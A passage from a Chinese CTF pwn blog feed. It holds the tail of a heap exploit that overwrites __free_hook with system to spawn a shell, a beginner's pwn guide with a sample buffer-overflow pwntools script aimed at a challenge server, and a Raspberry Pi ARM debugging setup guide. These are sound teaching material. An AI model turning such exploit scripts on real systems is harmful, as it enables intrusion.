class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门指南</title>
      <link href="/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这篇是因为学校社团招新需要给学弟学妹每个方向的大致印象，发展方向，当然我也希望这篇文章可以帮助到更多的人。接下来我会介绍一下入门pwn需要准备一些什么，学习一些什么，希望这些不成熟的意见可以帮助到刚开始入门pwn的你。由于篇幅有限，这里不会详细介绍各个知识点，更多的是一些链接，不涉及具体内容，只是帮你找到你应该学什么，推荐一些学习资源。</p><h1 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h1><p>这里推荐一些适合刚刚准备入门pwn方向的书籍，所以这里并没有列出一些pwn方向很重要，但不是新手需要的书籍。</p><h2 id="《程序员的自我修养：链接装载与库》"><a href="#《程序员的自我修养：链接装载与库》" class="headerlink" title="《程序员的自我修养：链接装载与库》"></a>《程序员的自我修养：链接装载与库》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/1b4c510fd9f9d72a95616a43df2a2834349bbb63" alt="程序员的自我修养"></p><p>这本书是对pwn入门来说非常非常有用的一本书，可以说是一本必读的书，能让你更清楚的了解很多pwn知识点背后的逻辑。可以说是必读的书了。</p><h2 id="《CTF竞赛权威指南（Pwn篇）》"><a href="#《CTF竞赛权威指南（Pwn篇）》" class="headerlink" title="《CTF竞赛权威指南（Pwn篇）》"></a>《CTF竞赛权威指南（Pwn篇）》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/0b55b319ebc4b74543a9b3057cb609178a82b901bfc4" alt="ctf权威指南"></p><p>书中涵盖了pwn各个方向的知识点，虽说很多最新的知识点该书不能提供，但是作为入门数据，这本书的知识点起码够你学大半年了。比市面上其他ctf入门书籍更加适合pwn手，强烈推荐。</p><h2 id="《深入理解计算机系统（又名CSAPP）》"><a href="#《深入理解计算机系统（又名CSAPP）》" class="headerlink" title="《深入理解计算机系统（又名CSAPP）》"></a>《深入理解计算机系统（又名CSAPP）》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/s29195878.jpg" alt="csapp"></p><p>这是一本很厚重的书，虽说没有像上面两本书那么直接对pwn做题有直接帮助，但是这本书一定是pwn方向，不不不，它可以说是所有计算机方向必读书籍了，对你长期成长来说肯定有帮助，希望在闲暇时间去读一读。</p><h1 id="网站以及入门视频推荐"><a href="#网站以及入门视频推荐" class="headerlink" title="网站以及入门视频推荐"></a>网站以及入门视频推荐</h1><p>刷题网站和ctfwiki这里就不做过多的赘述了，这里提供一些适合新人pwn方向独有的平台，和自己觉得不错的入门视频</p><h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719104848925.png" alt="pwnable.kr"></p><p>网址：<a href="https://pwnable.kr/">https://pwnable.kr/</a></p><p>这个平台的漏洞虽然和我们国内比赛主流方向的关系不是很大，但是里面有很多可以学习的知识点，还是很推荐大家做一做的，很多题目比较适合新手。</p><h2 id="XMCVE-2020-CTF-Pwn入门课程"><a href="#XMCVE-2020-CTF-Pwn入门课程" class="headerlink" title="XMCVE 2020 CTF Pwn入门课程"></a>XMCVE 2020 CTF Pwn入门课程</h2><p>网址：<a href="https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web">https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web</a></p><p>这部视频可以说是全b站最为详细的pwn入门视频了，细节抓的很清楚，缺点就是过于详实，可能会让你缺少一份自己的思考，视频时间也过长，需要耐心观看</p><h2 id="2020暑期Lilac-pwn入门培训"><a href="#2020暑期Lilac-pwn入门培训" class="headerlink" title="2020暑期Lilac-pwn入门培训"></a>2020暑期Lilac-pwn入门培训</h2><p>网址：<a href="https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web">https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web</a></p><p>这部视频其实是我入门时观看的视频，个人感觉讲解的很充分了，适合想要快速入门开始刷题的师傅们，其实从博客和题目中学习也是一种比较有效的方法</p><h1 id="pwn入门需要的基础知识"><a href="#pwn入门需要的基础知识" class="headerlink" title="pwn入门需要的基础知识"></a>pwn入门需要的基础知识</h1><h2 id="掌握c语言"><a href="#掌握c语言" class="headerlink" title="掌握c语言"></a>掌握c语言</h2><p>想要学习pwn首先就要学习c语言，这是最最最基础的工作，如果没有学习过c语言，可能连题目都看不懂。</p><p>推荐翁恺老师的c语言课程：<a href="https://www.icourse163.org/course/ZJU-9001?from=searchPage">https://www.icourse163.org/course/ZJU-9001?from=searchPage</a></p><h2 id="学习汇编"><a href="#学习汇编" class="headerlink" title="学习汇编"></a>学习汇编</h2><p>学习pwn还是要懂汇编语言的，起码先学习x86/x64下的汇编语言，学好汇编会让你开始的路走的很轻松，可以先学习8060的汇编，推荐王爽老师的《汇编语言》</p><h2 id="使用ida"><a href="#使用ida" class="headerlink" title="使用ida"></a>使用ida</h2><p>ida是一个非常好用的静态分析工具，可以说是一个神器，她会帮助你非常轻松的分析出题目的逻辑，基本是必须会使用的工具。你会发现ida的图标是一个女性，其实这是第一位程序员，她的名字就叫ida。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719111139804.png" alt="image-20210719111139804"></p><p>推荐一篇博客：<a href="https://xz.aliyun.com/t/4205%EF%BC%8C%E8%BF%99%E9%87%8C%E6%9C%89%E8%AF%A6%E7%BB%86%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">https://xz.aliyun.com/t/4205，这里有详细的使用教程</a></p><h2 id="使用pwndbg"><a href="#使用pwndbg" class="headerlink" title="使用pwndbg"></a>使用pwndbg</h2><p>这其实是一个gdb的调试插件，这个工具可以帮助你更好的进行动态分析。关于工具的安装可以看我的另一篇博客，虽然是针对arm架构的树莓派的，但对于x64的ubuntu也适用。</p><p>安装：<a href="https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p><h2 id="使用pwntools"><a href="#使用pwntools" class="headerlink" title="使用pwntools"></a>使用pwntools</h2><p>pwnatools的安装上面的链接中也有，这是一个编写python交互的库，是pwn入门必备的工具。</p><p>编写脚本类似这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">44908</span>)</span><br><span class="line">sh_addr=<span class="number">0x0804868B</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">24</span>+p32(sh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">262</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;your username:&quot;</span>,<span class="string">&#x27;kreomer&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;your passwd:&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>官方教程：<a href="https://docs.pwntools.com/en/latest/">https://docs.pwntools.com/en/latest/</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>pwn入门的基础基本就是以上这些，想要了解具体的攻击方法可以通过以上书籍、视频或者借助ctfwiki来学习（<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/%EF%BC%89%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%8F%AA%E6%98%AF%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%8C%87%E5%8D%97%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E6%B6%89%E5%8F%8A%E5%85%B7%E4%BD%93%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E3%80%82%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8A%E6%8F%90%E4%BE%9B%E7%9A%84%E9%93%BE%E6%8E%A5%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/），由于只是一个简单的指南，这里不涉及具体漏洞的攻击方法。可以通过以上提供的链接进行学习。</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用树莓派实现arm架构下的heap调试</title>
      <link href="/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/"/>
      <url>/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h1><p>​    在最近半年多的比赛中总是可以看到很多都涉及arm架构，比如：红明谷，虎符，国赛等大大小小的比赛都涉及了关于arm架构的题目。常规的做法是搭建<strong>quem</strong>虚拟机，然后使用<strong>gdbserver</strong>远程调试，来达到调试目的，当然也可以再用<strong>patchelf</strong>改一下动态链接库，使用<strong>python脚本</strong>交互。但是这样调试起来会发现没有调试，这种情况下当然也可以通过查看内存分布来进行调试。<strong>缺少了调试符调试起来感觉太麻烦了，也不够直观</strong>。当时的第一反应是下载<strong>带调试符的libc</strong>，当我找到对应版本的带有<strong>.debug</strong>文件的libc文件，使用patchelf将其和我们的binary绑定，同样使用quem来进行调试，可是这样依旧是显示没有调试符。而且看之前大师傅的博客说quem会存在一些奇奇怪怪的bug，就想是否可以直接使用arm架构的<strong>树莓派</strong>来搭建环境，调试arm下的题目。网上我查了好久也没找到类似的文章，就只能自己来试试了，顺便写出来分享给大家我的拙见，如果对你有帮助就太好了，也乘此机会搭建起来自己的博客，这就是我写这篇文章的开始，也是我博客的开始。</p><h1 id="树莓派的选择和ubuntu镜像烧录"><a href="#树莓派的选择和ubuntu镜像烧录" class="headerlink" title="树莓派的选择和ubuntu镜像烧录"></a>树莓派的选择和ubuntu镜像烧录</h1><h2 id="树莓派以及其他硬件的选择"><a href="#树莓派以及其他硬件的选择" class="headerlink" title="树莓派以及其他硬件的选择"></a>树莓派以及其他硬件的选择</h2><p>​    树莓派我选择的是<em>Raspberry Pi 4</em>，内存大小4GB，感觉就调试arm题目的话性能有点溢出，因为不使用桌面，所以内存可以选小一点，没必要选择这么大的内存，当然一切随你喜好。貌似还有香橙派，我不知道怎么样，有兴趣可以尝试，不保证可以搭配后面的流程，但其<strong>价格</strong>确实可爱的多。</p><p>​    树莓派使用的是<strong>tf</strong>卡，我觉得没必要买太大容量的，我环境完全搭建完成后也没有用太大的容量，同样是因为不需要桌面的原因。我们可以选择<strong>16GB</strong>的，这个容量应该是足够了。配套的需要一个一个<strong>读卡器</strong>来烧录镜像。</p><p>​    电源是<strong>5.1v=3.0A</strong>的，<strong>type-c</strong>接口，可以考虑使用手机充电器，但是最好还是买一个充电器比较好，这样比较方便。也可以考虑官方的充电器，就是有点小贵。</p><p>​    顺便一提，最好买个“机箱”，这样能保护好电路板，方便携带，同时要做好散热工作，散热片是要的，也可以使用一个小风扇。类似下图</p><p>​    <img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210716193707410.png" alt="树莓派机箱和风扇"></p><p>​    这里可能还需要使用显示屏和键盘，当然只有第一次搭建的时候需要使用，ubuntu官方文档中说可以不需要，但是我尝试了有一整天，并不能达到我想要的效果，这里放在后面环境搭建的时候再说。树莓派的视频接口是<strong>Micro</strong>，所以你需要有一头是Micro的视频传输线，也可以使用转换接口，我使用的就是转换接口，毕竟只用这一次，没必要买太贵的，键盘和显示屏都是借用舍友的，这里感谢我的舍友。</p><p>​    硬件就是这些啦，准备好硬件后就可以进行烧录和启动我们的ubuntu系统啦</p><h2 id="ubuntu环境的烧录和启动"><a href="#ubuntu环境的烧录和启动" class="headerlink" title="ubuntu环境的烧录和启动"></a>ubuntu环境的烧录和启动</h2><p>​    这里提供一个链接指导我们的安装ubuntu镜像(<a href="https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview">https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview</a>),</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717084431014.png" alt="烧录工具"></p><p>​    这里有三个不同的选项根据你主机的操作系统选择合适的烧录。具体的烧录方法可以参考上面的链接，内容很详实。一定要仔细看上面的官方文档，不然可能会出现一些奇奇怪怪的问题。</p><p>​    关于树莓派的wifi链接这里有个大坑，官方文档是这样说的：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717090334507.png" alt="官方文档截图"></p><p>​    </p><p>但是实际上这里如果没有显示屏和键盘的话无法重启进行重启，也就<strong>无法连接</strong>到wife，而且由于某些奇怪的原因这个<strong>配置文件</strong>还需要在开机后再次编写以保证格式，所以之前准备工作才说明需要显示屏和键盘，当然你也可以再尝试尝试，说不定就成功了，有时候挺玄学的。</p><p>这里我基本花了一天时间，大多数时间在无意义的修改配置文件，因为没有显示屏转换器，以为是配置文件格式问题，结果花了一天时间都没解决，等转换器到了使用显示器基本一会就解决了，只要你的配置文件格式保证，开机后设置密码，然后<strong>重启</strong>，重启以后<strong>等待一会</strong>基本就可以连接到wifi了，如果无法链接，检查一下配置文件</p><p><strong>注意：配置文件中冒号后面一定有换行或者空格，而且还要注意对齐</strong>。</p><h1 id="寻找树莓派IP以及ssh连接"><a href="#寻找树莓派IP以及ssh连接" class="headerlink" title="寻找树莓派IP以及ssh连接"></a>寻找树莓派IP以及ssh连接</h1><h2 id="寻找树莓派ip地址"><a href="#寻找树莓派ip地址" class="headerlink" title="寻找树莓派ip地址"></a>寻找树莓派ip地址</h2><p>官方文档给了一种寻找树莓派的方法，但是我尝试过后感觉并不是很有用，后来发现其mac地址和官方的有出入，假如你使用的是手机热点，并且你的手机热点可以显示ip地址最好不过了，如果是其他情况的话这里我推荐使用<strong>Nmap</strong>来进行扫描。</p><p>这里肯定先要保证你和树莓派在同一个wifi下，然后检查你本地的ip地址win操作系统下使用<code>ipconfig</code>查看本地IP地址</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717093955362.png" alt="查看本地ip"></p><p>可以看到<strong>ip</strong>地址是192.168.43.29,<strong>子网掩码</strong>是255.255.255.0，那么我们就要检查192.168.43.1/24这个网络下的存活的ip有哪些</p><p>使用<code>nmap -sP 192.168.43.1/24</code>命令我们可以看到</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717094520150.png" alt="寻找树莓派"></p><p>有两台存活主机，一台是我们主机，那么另一台就是我们的树莓派了，当然可以看到其mac地址后面也告诉我们这台主机是树莓派。这样我们就找到我们树莓派的ip是192.168.43.29。</p><h2 id="使用FInallshell进行连接"><a href="#使用FInallshell进行连接" class="headerlink" title="使用FInallshell进行连接"></a>使用FInallshell进行连接</h2><p>接下来我推荐使用Finalshell来建立连接。这个工具要比xshell好用好多了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095624945.png" alt="Finalshell"></p><p>首先点击这里打开连接管理器</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095715919.png" alt="连接管理器"></p><p>再点击这里新建ssh连接</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095821208.png" alt="新建ssh连接"></p><p>以这样的格式填写即可。</p><p>然后就可以开始链接我们的树莓派啦，当然你肯定会觉得这个窗口不是很好看，背景挺碍眼的，这里其实可以<strong>关闭背景</strong>，鼠标右击可以看到下面有设置背景图片</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100427076.png" alt="设置背景图片"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100719414.png" alt="配置配色字体以及关闭背景"></p><p>把启用图片的√打掉就好了，此时你还发现取消掉背景怎么还是蓝色的，别着急，看看这里还要配色栏，你有很多钟配色可以选择，最下面有字体大小选择，这样就可以选择合适的字体大小和配色啦（毕竟<em>皮肤和坐骑的搭配才是获胜的关键</em>，这样就可以舒舒服服的进行调试啦。</p><h1 id="pwn调试环境搭建"><a href="#pwn调试环境搭建" class="headerlink" title="pwn调试环境搭建"></a>pwn调试环境搭建</h1><p>接下来就可以正式开始我们的环境搭建了，这里才是痛苦的开始，在配置环境期间遇到了数不清的问题，这一部分仅供参考，实际安装的时候还是要记得多搜索，毕竟这里每个人遇到的情况都有可能不同。</p><h2 id="python2的pip安装和pwntools安装"><a href="#python2的pip安装和pwntools安装" class="headerlink" title="python2的pip安装和pwntools安装"></a>python2的pip安装和pwntools安装</h2><p>我们先来解决最困难的，也就是python2的pwntools安装，之前一直是直接使用pip连接并没有发现什么问题，但是这次却有些问题，不管怎么说先安装python2</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install python</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1</span><br></pre></td></tr></table></figure><p>这样就将python的默认为python2了，如下图</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717105912959.png" alt="python默认pthon2"></p><p>接下来是pip的安装，现在已经无法正常安装python2的pip了，只能采取一些其他的手法,先安装setup-tools，这里需要先安装打开zip文件的软件</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install unzip</span><br><span class="line">wget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip<span class="comment">#md5=74663b15117d9a2cc5295d76011e6fd1</span></span><br><span class="line">unzip setuptools-36.6.0.zip </span><br><span class="line"><span class="built_in">cd</span> setuptools-36.6.0</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>再安装pip</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure><p>查看pip版本<code>pip --version </code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113029446.png" alt="检查pip版本"></p><p>说明pip安装完成</p><p>接下来安装pwntools</p><p>安装pwntools之前还需要一些准备工作,</p><p>安装gcc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><p>安装capstone</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install make </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/aquynh/capstone</span><br><span class="line"><span class="built_in">cd</span> capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>安装pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools</span><br><span class="line"><span class="built_in">cd</span> pwntools</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>验证一下pwntools可用</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113956081.png" alt="验证pwntools"></p><p>如果不出意外，这里pwntools就安装好了，<strong>不要尝试</strong>用pip安装，基本不可能安装成功的，如果有其他情况就多搜索吧，或者评论区问我，如果我知道怎么回事，会给你回复的。这里pwntools算是安装完成了如果有问题我还是推荐装python3的pwntools吧,可能哪一天python2就不能用了,不是吗,我在装32位arm的ubuntu环境的时候发现无论如何都搞不定,我已经绝望了,还是适应python3吧.</p><p>python3安装pwntools的话就简单多了</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">pip3 install --upgrade pwntools</span><br></pre></td></tr></table></figure><h2 id="pwndbg安装"><a href="#pwndbg安装" class="headerlink" title="pwndbg安装"></a>pwndbg安装</h2><p>使用下面命令来安装pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717121038336.png" alt="验证pwndbg安装"></p><p>这样就是安装成功啦</p><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>patchelf是我们用来改写文件ld和libc的这里推荐<em>patchelf_0.12</em></p><p><a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p><p>github地址在这里里面有详细的教学，这里就不赘述啦</p><p>按照官方教程来就好了</p><h2 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc all in one"></a>glibc all in one</h2><p>这里还需要glibc all in one，虽然glibc all in one的下的库是x86下的，但是这个可以帮助我们很好的管理gliibc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br></pre></td></tr></table></figure><p>使用上面语句进行下载</p><p>然后随便下载一个libc，形成文件夹</p><p>下载好后需要安装一个库,并形成文件夹</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chmod 777 -R glibc-all-in-one/</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">sudo pip install requests </span><br><span class="line">./update_list</span><br><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure><p>这样基本就完成了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717131220453.png" alt="完成后的效果"></p><p>类似上图，然后删除debs和libc里的文件，这些都是x86下的，用不到的.</p><h1 id="如何更改libc并完成调试"><a href="#如何更改libc并完成调试" class="headerlink" title="如何更改libc并完成调试"></a>如何更改libc并完成调试</h1><h2 id="下载libc"><a href="#下载libc" class="headerlink" title="下载libc"></a>下载libc</h2><p>当什么的工作都完成了我们就可以开始调试啦，我们以一道题目为例</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717130021816.png" alt="例子"></p><p>一般附件会给我们四个文件，这里我们需要的只要libc-2.31.so和题目文件</p><p>先将libc放入我们的树莓派系统中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x libc-2.31.so</span><br><span class="line">./libc-2.31.so</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132511485.png" alt="查看libc版本"></p><p>这样我们就能找到对应的libc版本</p><p>在这个网站中我们可以找到不同架构的不同版本libc，只要<strong>更改最后的路径</strong>即可,需要什么版本搜索什么</p><p><a href="https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2">https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2</a></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132941579.png" alt="寻找libc"></p><p>点击上图的arm64</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133112289.png" alt="需要下载的包">下载如图所示的文件(其他版本也是这样格式)到这里*/home/<strong>yourneme</strong>/glibc-all-in-one/debs<em>，注意<strong>yourname</strong>是你主机的名字，可以直接<strong>拖动</strong>到Finallshell显示的该文件夹下，或者*<em>复制</em></em></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133330375.png" alt="下载路径"></p><p>路径如图</p><p>在glibc目录下运行下面命令（<strong>注意更改路径，将ubuntu换成你的名字</strong>）</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64</span><br><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6-dbg_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64/.debug</span><br></pre></td></tr></table></figure><p>这样libc就部署好了。</p><h2 id="使用patchelf改变ld和libc"><a href="#使用patchelf改变ld和libc" class="headerlink" title="使用patchelf改变ld和libc"></a>使用patchelf改变ld和libc</h2><p>这里提供一个脚本来帮助师傅们更改libc，脚本来源：<em><a href="https://bbs.pediy.com/thread-254868.htm">https://bbs.pediy.com/thread-254868.htm</a></em></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -x</span><br><span class="line">libc_path=<span class="variable">$1</span></span><br><span class="line">elf_path=<span class="variable">$2</span></span><br><span class="line">patchelf_bin_path=<span class="string">&quot;/home/ubuntu/patchelf/src/patchelf&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$&#123;libc_path&#125;</span>/ld-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --set-interpreter <span class="variable">$libc_path</span>/ld-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span 